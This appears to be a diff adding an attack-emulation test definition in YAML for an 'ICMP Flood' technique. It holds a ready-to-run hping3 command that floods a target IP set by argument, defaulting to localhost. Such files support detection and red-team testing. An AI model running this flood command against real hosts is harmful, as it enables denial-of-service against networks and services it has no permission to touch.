@@ -1,0 +1,27 @@
+attack_technique: icmp_flood
+display_name: "ICMP Flood Attack"
+category: "Flood"
+atomic_tests:
+- name: "ICMP Flood"
+  description: ""
+  reference: "https://security.radware.com/ddos-knowledge-center/ddospedia/icmp-flood/"
+  supported_platforms:
+  - linux
+  input_arguments:
+    target_ip:
+      description: "Target IP"
+      type: String
+      default: 127.0.0.1
+    interface:
+      description: "interface to use"
+      type: String
+      default: eth0
+    extra_args:
+      description: "extra arguments"
+      type: String
+      default: -V -d 120 --flood -c 10
+  executor:
+    command: |
+      hping3 --icmp -n -I #{interface} #{extra_args} #{target_ip}
+    cleanup_command: ""
+    name: command_prompt
